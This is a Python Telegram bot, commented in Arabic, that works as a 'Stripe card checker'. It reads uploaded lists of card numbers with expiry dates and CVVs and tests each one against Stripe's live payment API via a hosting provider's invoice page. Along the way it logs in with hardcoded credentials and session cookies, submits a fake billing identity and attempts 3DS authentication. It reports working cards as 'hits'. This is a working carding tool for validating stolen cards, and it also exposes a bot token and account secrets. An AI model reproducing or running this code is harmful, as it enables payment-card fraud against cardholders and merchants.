import os
import asyncio
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== الإعدادات ==========
BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"  # ضع توكن البوت هنا
ADMIN_IDS = [5895491379]  # ضع ID التليجرام بتاعك

INVOICE_ID = "260528"
USERNAME = "renes98352@neuraxo.com"
PASSWORD = "8AEBsC#3x5wZKs!"
LOGIN_PAGE_URL = "https://vsys.host/index.php?rp=/login"

cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    'VsysFirstVisit': '1761307789',
    'WHMCSqCgI4rzA0cru': 'm1ehetmctequ9op73ccg4mfbnv',
    'WHMCSlogin_auth_tk': 'citwYWUwWFBwYTRzbG5xaUx2ZmNvRlJGOWtqcklzRkJxa09ab0RPVFhtTURiaXA2dER1ZEFrVU1xZG5Tc0pvRml3OXVUVjJUc0JRUjlzZm8rWmhSdmw3TUpSMGRFQXhKcU1UcmlXbEZQcFJPeUgxS3NYMll5R3Bwa0hIRXZXUFpqMVE3RGtsOTIzeXA5WW84TU1OR3N2b0JHbzEzUVBhd0pEUy80aDljSS80RkNJQys2YWczWEJSdERLa2txYnpHZkNZVVduUm8yZkRDdGFvV2ZCVXB3bVQ5TGd1UjJ2aC9tbEg5VkFrSjBBVkJiN20yME1Tc0p6bmhPY21KSy9LVFU4ZHU3cy9zczhIWFRoT2NlRndTa0EyOHpTVTluNVlQdUJPOWZrbWp0dmc5bUJkM2d1cm9pcy9TMGpOdmFqSUhlL1RSSlNiZ3FIRTBkODNvRUpsRUhSVzZkZ0pxWmIrQ08xZlU4aUFaeEkwWUx6VjRzWU13T3NMa3VkcnlJdHd6TjdlYVkvdXdWZ2x6Y0VOYXRJQlZqS0V4VkVCN0hNM2JIZ1RKOXVNPQ%3D%3D',
}

# ========== إحصائيات عامة ==========
stats = {
    'total': 0,
    'checked': 0,
    'approved': 0,
    'live': 0,
    'declined': 0,
    'checking': [],  # البطاقات اللي بتتفحص حاليًا
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
}

session_error_count = 0
session_lock = threading.Lock()
checking_lock = threading.Lock()

# ========== دالات الفحص ==========
def do_login():
    global cookies
    try:
        sess = requests.Session()
        sess.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        resp = sess.get(LOGIN_PAGE_URL, timeout=15, verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        token_input = soup.find("input", {"name": "token"})
        token = token_input["value"] if token_input else ""
        
        post_data = {
            "token": token,
            "username": USERNAME,
            "password": PASSWORD,
            "rememberme": "on",
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://vsys.host",
            "Referer": LOGIN_PAGE_URL,
        }
        
        login_resp = sess.post(LOGIN_PAGE_URL, data=post_data, headers=headers, timeout=15, verify=False)
        
        if "clientarea.php" in login_resp.url:
            cookies.update(sess.cookies.get_dict())
            return True
        return False
    except:
        return False

def get_session_data():
    session = requests.Session()
    data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
    try:
        session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', 
                    data=data, cookies=cookies, verify=False, timeout=10)
    except:
        pass
    
    resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                       cookies=cookies, verify=False, timeout=10)
    
    m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
    if not m or '/pay/' not in m.group(0):
        return None, None, None
    
    session_id = m.group(0).split('/pay/')[1].split('#')[0]
    new_cookies = session.cookies.get_dict()
    stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
    stripe_sid = new_cookies.get('__stripe_sid', '')
    
    return session_id, stripe_mid, stripe_sid

async def check_card(card, bot_app):
    global session_error_count
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        return card, "❌ صيغة خاطئة"
    
    cc, mm, yy, cvv = parts
    masked = f"{cc[:6]}******{cc[-4:]}"
    
    # إضافة للقائمة المؤقتة
    with checking_lock:
        stats['checking'].append({
            'card': masked,
            'status': '⏳ جاري الفحص...'
        })
    
    await update_dashboard(bot_app)
    
    session_id, mid, sid = get_session_data()
    if not session_id:
        with session_lock:
            session_error_count += 1
            if session_error_count >= 3:
                do_login()
                session_error_count = 0
        
        with checking_lock:
            stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
            stats['declined'] += 1
        await update_dashboard(bot_app)
        return card, "❌ فشل جلب session"
    
    headers_api = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    pm_data = (
        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
        'billing_details[name]=Mario+Rossi&billing_details[email]=mario.rossi%40gmail.com&'
        'billing_details[address][line1]=Via+Roma+123&'
        'billing_details[address][city]=Milano&'
        'billing_details[address][postal_code]=20121&'
        f'billing_details[address][country]=IT&muid={mid}'
    )
    
    if sid:
        pm_data += f'&sid={sid}'
    
    pm_data += (
        '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
        f'client_attribution_metadata[checkout_session_id]={session_id}'
    )
    
    try:
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                          headers=headers_api, data=pm_data, timeout=15)
        pm_res = r1.json()
        
        if 'error' in pm_res:
            result = f"❌ {pm_res['error'].get('message', 'خطأ')[:30]}"
            with checking_lock:
                stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
                stats['declined'] += 1
                stats['checked'] += 1
            await update_dashboard(bot_app)
            return card, result
        
        if 'id' not in pm_res:
            with checking_lock:
                stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
                stats['declined'] += 1
                stats['checked'] += 1
            await update_dashboard(bot_app)
            return card, "❌ فشل إنشاء PM"
        
        pm_id = pm_res['id']
        confirm_data = f'payment_method={pm_id}&expected_amount=6800'
        if mid:
            confirm_data += f'&muid={mid}'
        if sid:
            confirm_data += f'&sid={sid}'
        confirm_data += f'&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
        
        r2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                          headers=headers_api, data=confirm_data, timeout=15)
        
        confirm_res = r2.json()
        
        if 'payment_intent' not in confirm_res:
            with checking_lock:
                stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
                stats['declined'] += 1
                stats['checked'] += 1
            await update_dashboard(bot_app)
            return card, "⚠️ لا يوجد payment_intent"
        
        pi = confirm_res['payment_intent']
        status = pi.get('status')
        
        if status == 'succeeded':
            with checking_lock:
                stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
                stats['approved'] += 1
                stats['checked'] += 1
            await update_dashboard(bot_app)
            await send_hit(bot_app, card, "✅ Approved")
            return card, "✅ Approved"
        
        if status == 'requires_action':
            na = pi.get('next_action', {})
            if na.get('type') == 'use_stripe_sdk':
                source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if source_id:
                    tds_data = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate',
                                      headers=headers_api, data=tds_data, timeout=15)
                    tds_res = r3.json()
                    
                    trans = tds_res.get('ares', {}).get('transStatus') or tds_res.get('transStatus')
                    
                    if trans == 'Y':
                        with checking_lock:
                            stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
                            stats['approved'] += 1
                            stats['checked'] += 1
                        await update_dashboard(bot_app)
                        await send_hit(bot_app, card, "✅ Approved (3DS)")
                        return card, "✅ Approved (3DS)"
                    elif trans == 'N':
                        with checking_lock:
                            stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
                            stats['live'] += 1
                            stats['checked'] += 1
                        await update_dashboard(bot_app)
                        await send_hit(bot_app, card, "✅ Live")
                        return card, "✅ Live"
        
        error = pi.get('last_payment_error', {})
        result = f"❌ {error.get('message', status)[:30]}" if error else f"❌ {status}"
        
        with checking_lock:
            stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
            stats['declined'] += 1
            stats['checked'] += 1
        await update_dashboard(bot_app)
        return card, result
        
    except Exception as e:
        with checking_lock:
            stats['checking'] = [c for c in stats['checking'] if c['card'] != masked]
            stats['declined'] += 1
            stats['checked'] += 1
        await update_dashboard(bot_app)
        return card, f"❌ {str(e)[:30]}"

# ========== دالات البوت ==========
def create_dashboard_text():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    progress = (stats['checked'] / stats['total'] * 100) if stats['total'] > 0 else 0
    
    text = f"""
╔════════════════════════════╗
║   🔰 STRIPE CARD CHECKER 🔰   
╚════════════════════════════╝

📊 **الإحصائيات:**
━━━━━━━━━━━━━━━━━━━━━
📥 إجمالي: `{stats['total']}`
✅ تم الفحص: `{stats['checked']}/{stats['total']}`
📈 التقدم: `{progress:.1f}%`

━━━━━━━━━━━━━━━━━━━━━
💳 **النتائج:**
━━━━━━━━━━━━━━━━━━━━━
✅ Approved: `{stats['approved']}`
🟢 Live: `{stats['live']}`
❌ Declined: `{stats['declined']}`

━━━━━━━━━━━━━━━━━━━━━
⏱ **الوقت:** `{hours:02d}:{mins:02d}:{secs:02d}`
━━━━━━━━━━━━━━━━━━━━━

🔄 **قيد الفحص الآن:**
"""
    
    if stats['checking']:
        for item in stats['checking'][:3]:  # أول 3 فقط
            text += f"└ `{item['card']}` {item['status']}\n"
    else:
        text += "└ لا يوجد بطاقات قيد الفحص\n"
    
    text += "\n━━━━━━━━━━━━━━━━━━━━━"
    
    status_emoji = "🟢" if stats['is_running'] else "🔴"
    status_text = "جاري الفحص..." if stats['is_running'] else "متوقف"
    text += f"\n{status_emoji} **الحالة:** {status_text}"
    
    return text

async def update_dashboard(bot_app):
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            keyboard = [
                [InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")]
            ] if stats['is_running'] else []
            
            reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
            
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text=create_dashboard_text(),
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        except:
            pass

async def send_hit(bot_app, card, result):
    if stats['chat_id']:
        text = f"""
╔═══════════════════════╗
║     🎉 **HIT FOUND!** 🎉     
╚═══════════════════════╝

💳 **البطاقة:** `{card}`
📌 **النتيجة:** {result}
⏰ **الوقت:** `{datetime.now().strftime('%H:%M:%S')}`

━━━━━━━━━━━━━━━━━━━━
"""
        try:
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=text,
                parse_mode='Markdown'
            )
        except:
            pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ عذرًا، أنت لست مصرحًا باستخدام هذا البوت.")
        return
    
    text = """
╔════════════════════════════╗
║   🔰 STRIPE CARD CHECKER 🔰   
╚════════════════════════════╝

👋 مرحبًا بك في بوت فحص البطاقات!

📝 **كيفية الاستخدام:**
━━━━━━━━━━━━━━━━━━━━━
1️⃣ أرسل ملف .txt يحتوي على البطاقات
2️⃣ الصيغة: `رقم|شهر|سنة|cvv`
3️⃣ سيبدأ الفحص تلقائيًا

✨ **المميزات:**
━━━━━━━━━━━━━━━━━━━━━
• Dashboard مباشر للمتابعة
• إشعارات فورية للبطاقات الناجحة
• إمكانية إيقاف الفحص
• إحصائيات تفصيلية

━━━━━━━━━━━━━━━━━━━━━
🚀 جاهز للبدء!
"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري بالفعل! استخدم زر الإيقاف أولاً.")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = file_content.decode('utf-8').strip().split('\n')
    
    # إعادة تعيين الإحصائيات
    stats['total'] = len(cards)
    stats['checked'] = 0
    stats['approved'] = 0
    stats['live'] = 0
    stats['declined'] = 0
    stats['checking'] = []
    stats['start_time'] = datetime.now()
    stats['is_running'] = True
    stats['chat_id'] = update.effective_chat.id
    
    # إنشاء Dashboard
    keyboard = [[InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    dashboard_msg = await update.message.reply_text(
        create_dashboard_text(),
        parse_mode='Markdown',
        reply_markup=reply_markup
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    # بدء الفحص في thread منفصل
    def run_checker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_cards(cards, context.application))
        loop.close()
    
    checker_thread = threading.Thread(target=run_checker, daemon=True)
    checker_thread.start()

async def process_cards(cards, bot_app):
    for i in range(0, len(cards), 3):
        if not stats['is_running']:
            break
        
        batch = cards[i:i+3]
        tasks = [check_card(card, bot_app) for card in batch]
        await asyncio.gather(*tasks)
        
        if i + 3 < len(cards):
            await asyncio.sleep(3)
    
    stats['is_running'] = False
    await update_dashboard(bot_app)
    
    if stats['chat_id']:
        final_text = f"""
╔═══════════════════════════╗
║     ✅ **اكتمل الفحص!** ✅     
╚═══════════════════════════╝

📊 **النتائج النهائية:**
━━━━━━━━━━━━━━━━━━━━━
✅ Approved: `{stats['approved']}`
🟢 Live: `{stats['live']}`
❌ Declined: `{stats['declined']}`
📥 الإجمالي: `{stats['total']}`

━━━━━━━━━━━━━━━━━━━━━
🎉 شكراً لاستخدامك البوت!
"""
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text=final_text,
            parse_mode='Markdown'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "stop_check":
        stats['is_running'] = False
        await query.edit_message_text(
            text=create_dashboard_text() + "\n\n⚠️ **تم إيقاف الفحص بواسطة المستخدم**",
            parse_mode='Markdown'
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 البوت يعمل الآن...")
    app.run_polling()

if __name__ == "__main__":
    main()
